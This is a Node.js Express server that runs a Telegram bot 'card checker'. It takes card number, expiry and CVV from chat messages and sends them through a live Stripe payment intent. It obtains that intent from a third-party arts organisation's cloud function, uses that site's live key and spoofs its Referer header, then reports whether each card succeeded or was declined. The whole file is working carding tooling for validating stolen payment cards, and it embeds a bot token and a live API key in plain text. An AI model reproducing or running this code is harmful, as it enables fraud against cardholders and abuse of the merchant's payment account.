const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

const TG_TOKEN = '8309621598:AAFodHRbkYUS2TzQyAwDA9N1ripuiRld2fU';
const STRIPE_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
const ARTSPAN_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';

// --- 1. HOME ROUTE ---
app.get('/', (req, res) => res.send('Gate API is Running 🟢'));

// --- 2. WEBHOOK ROUTE (Telegram hits this) ---
app.post('/webhook', async (req, res) => {
    const msg = req.body.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const chatId = msg.chat.id;
    const text = msg.text;

    if (text.startsWith('/chk')) {
        const input = text.split(' ')[1];
        if (!input) {
            await sendTgMessage(chatId, "❌ Format: `/chk num|mm|yy|cvv`.");
            return res.sendStatus(200);
        }

        const [num, mon, year, cvv] = input.split('|').map(i => i.trim());
        await sendTgMessage(chatId, "📡 **Processing Handshake...**");

        try {
            // Get Intent
            const intent = await axios.post(ARTSPAN_API, { amount: 100, email: "api@test.com", live: true });
            const secret = intent.data.clientSecret;

            // Confirm
            const confirm = await axios.post(`https://api.stripe.com/v1/payment_intents/${secret.split('_secret')[0]}/confirm`, 
                new URLSearchParams({
                    'payment_method_data[type]': 'card',
                    'payment_method_data[card][number]': num,
                    'payment_method_data[card][cvc]': cvv,
                    'payment_method_data[card][exp_month]': parseInt(mon),
                    'payment_method_data[card][exp_year]': year.length === 2 ? `20${year}` : year,
                    'key': STRIPE_PK,
                    'client_secret': secret
                }).toString(),
                { headers: { 'Referer': 'https://www.artspan.org/' } }
            ).catch(e => e.response);

            const data = confirm.data;
            let result = data.status === 'succeeded' 
                ? `✅ **SUCCESS**\n💳 Card: \`${num}\`` 
                : `🔴 **DECLINED**\n💳 Card: \`${num}\`\n💬 Msg: ${data.error ? data.error.message : 'Unknown'}`;

            await sendTgMessage(chatId, result);
        } catch (e) {
            await sendTgMessage(chatId, "❌ Error: " + e.message);
        }
    }
    res.sendStatus(200);
});

// Helper function to send messages back to TG
async function sendTgMessage(chatId, text) {
    await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown'
    });
}

app.listen(PORT, () => console.log(`Server live on ${PORT}`));
